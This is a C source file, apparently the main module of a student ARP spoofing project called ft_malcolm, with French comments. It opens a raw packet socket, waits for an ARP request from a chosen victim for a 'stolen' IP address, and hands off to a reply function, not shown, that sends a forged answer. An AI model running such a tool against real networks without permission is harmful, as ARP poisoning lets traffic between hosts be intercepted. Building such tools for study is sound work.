#include "../includes/ft_malcolm.h"


static volatile sig_atomic_t g_stop = 0;

static void sigint_handler(int sig)
{
	(void)sig;
	g_stop = 1;
}

int create_socket(void) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (fd < 0) {
		return -1;
	}
	struct timeval timeout;
	timeout.tv_sec = 2;
	timeout.tv_usec = 0;
	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
		close(fd);
		return -1;
	}
	return fd;
}


int arp_loop(int fd, char **av) {
    char *ip_from = av[3];
    char *mac_from = av[4];
    char *stolen_ip = av[1];


    unsigned char buf[2048];

    struct sockaddr_ll sll;
    socklen_t sll_len = sizeof(sll);

    /* Attente d'une requete ARP */
    while (!g_stop) {
        sll_len = sizeof(sll);
        ssize_t bytes_recv = recvfrom(fd, buf, sizeof(buf), 0, (struct sockaddr *)&sll, &sll_len);
        if (bytes_recv < 0) {
            if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
                continue;
            fprintf(stderr, "Error: recvfrom: %s\n", strerror(errno));
            return TRUE;
        }
        if (g_stop)
            break;
        if (is_ethernet_ipv4_arp(buf, (size_t)bytes_recv) == FALSE
            ||is_correct_ip(ip_from, stolen_ip, buf) == FALSE
            ||is_correct_mac(mac_from, buf) == FALSE)
            continue;

        if (buf[20] != 0x00 || buf[21] != 0x01)
            continue;
        if (g_stop)
            break;
        return arp_reply(fd, av, sll.sll_ifindex);
    }
    return FALSE;
}

// sudo ./ft_malcolm <ip volée> <mac de ma machine> <ip qui demande> <mac de la machine qui demande>
int main(int ac, char** av) {

    /* Verification du parsing */
    if (error_parse_args(ac, av)) {
        return TRUE; // ?
    }

    /* Mise en place du Ctrl C */
    struct sigaction sa = {0};
    sa.sa_handler = sigint_handler;
    sa.sa_flags = 0;
    if (sigaction(SIGINT, &sa, NULL) < 0) {
		return error_msg("problem while setting signal handler\n");
	}

    /* Création de la socket */
    int fd = create_socket();
    if (fd == -1) {
        return error_msg("Error: Error while creating the socket\n");
    }

    /* Boucle en attente de la requête ARP de la cible */
    int status = arp_loop(fd, av);

    close(fd);
    return status;
}
